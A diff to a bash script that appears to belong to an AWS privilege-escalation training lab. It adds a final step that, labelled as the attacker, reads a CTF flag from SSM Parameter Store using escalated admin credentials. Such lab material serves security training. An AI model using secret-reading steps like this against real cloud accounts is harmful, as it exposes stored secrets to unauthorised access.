@@ -371,6 +371,24 @@ echo ""
 # Clean up temporary files
 rm -f $PYTHON_SCRIPT
 
+# [EXPLOIT] Step 12: Capture the CTF flag
+echo -e "${YELLOW}Step 12: Capturing the CTF flag${NC}"
+echo "Reading the flag from SSM Parameter Store using admin credentials..."
+FLAG_PARAM="/pathfinding-labs/flags/bedrock-001-to-admin"
+
+show_attack_cmd "Attacker" "aws ssm get-parameter --name '${FLAG_PARAM}' --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter \
+    --name "$FLAG_PARAM" \
+    --query 'Parameter.Value' \
+    --output text 2>/dev/null)
+
+if [ $? -eq 0 ] && [ -n "$FLAG_VALUE" ]; then
+    echo -e "${GREEN}✓ FLAG CAPTURED: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${YELLOW}⚠ Could not retrieve flag (parameter may not exist yet)${NC}"
+fi
+echo ""
+
 # Summary
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
